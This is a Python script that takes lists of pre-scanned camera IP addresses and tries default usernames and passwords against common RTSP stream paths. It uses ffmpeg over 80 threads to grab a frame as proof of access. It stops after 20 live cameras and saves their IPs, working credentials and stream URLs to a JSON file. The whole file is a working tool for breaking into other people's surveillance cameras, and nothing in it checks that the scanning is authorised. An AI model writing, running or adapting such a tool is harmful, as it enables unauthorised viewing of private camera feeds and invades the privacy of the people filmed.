#!/usr/bin/env python3
"""
Probe existing camera targets to find 20 live streams
Uses pre-scanned IP lists from cam_targets.txt and cam_targets_dual.txt
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

CREDS = [
    ('admin', ''), ('admin', '12345'), ('admin', 'admin'), 
    ('root', ''), ('root', 'pass'), ('root', '1234'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101', '/Streaming/Channels/1', 
    '/h264/ch1/main/av_stream', '/stream1', '/live/ch00_0',
]

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

def load_targets():
    """Load pre-scanned camera IPs"""
    targets = set()
    
    files = [
        'cam_targets.txt',
        'cam_targets_dual.txt', 
        'cam_targets_batch2.txt'
    ]
    
    for fname in files:
        fpath = os.path.join(WORK_DIR, fname)
        if os.path.exists(fpath):
            with open(fpath) as f:
                for line in f:
                    ip = line.strip()
                    if ip and not ip.startswith('#'):
                        targets.add(ip)
    
    return list(targets)

def probe_rtsp(ip):
    """Fast RTSP probe"""
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=2, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    }
            except:
                pass
            try:
                if os.path.exists(frame):
                    os.remove(frame)
            except:
                pass
    return None

def main():
    print(f'{"="*60}', flush=True)
    print(f'PROBING PRE-SCANNED TARGETS FOR 20 LIVE CAMERAS', flush=True)
    print(f'{"="*60}', flush=True)
    
    targets = load_targets()
    print(f'  [+] Loaded {len(targets)} pre-scanned targets\n', flush=True)
    
    if not targets:
        print('[!] No targets loaded. Exiting.', flush=True)
        return
    
    # Probe for live cameras
    streams = []
    done = 0
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=80) as pool:
        futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    el = time.time() - t0
                    print(f'  [{done}/{len(targets)}] *** STREAM #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B | {el:.0f}s', flush=True)
                    
                    if len(streams) >= 20:
                        # Cancel remaining futures
                        for f in futures:
                            f.cancel()
                        break
            except Exception as e:
                pass
    
    el = time.time() - t0
    print(f'\n  [DONE] Found {len(streams)} live streams in {el:.0f}s', flush=True)
    
    if streams:
        print(f'\n=== {len(streams)} LIVE CAMERAS ===', flush=True)
        for i, s in enumerate(streams, 1):
            print(f'  {i:>2}. {s["ip"]:>16} | {s["user"]}:{s["password"]}', flush=True)
            print(f'      {s["rtsp_url"]}', flush=True)
        
        # Save results
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = os.path.join(WORK_DIR, f'found_20cams_{ts}.json')
        with open(out_file, 'w') as f:
            json.dump({'streams': streams, 'count': len(streams)}, f, indent=2)
        print(f'\n[+] Saved: {out_file}', flush=True)
    else:
        print('[!] No streams found.', flush=True)

if __name__ == '__main__':
    main()
